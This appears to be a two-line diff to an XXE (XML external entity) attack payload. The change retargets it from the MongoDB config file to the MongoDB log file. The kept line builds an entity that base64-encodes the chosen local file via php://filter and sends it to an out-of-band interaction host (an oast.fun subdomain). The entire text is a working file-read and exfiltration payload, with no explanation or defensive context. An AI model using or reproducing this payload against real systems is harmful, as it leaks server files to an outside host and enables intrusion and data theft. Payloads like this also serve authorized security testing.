@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/mongod.conf">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///var/log/mongodb/mongod.log">
 <!ENTITY % inception "<!ENTITY exfil SYSTEM 'https://yxbzthesqwtqlzsjuqzxflkn4olz7mnkx.oast.fun/data?%data;'>">
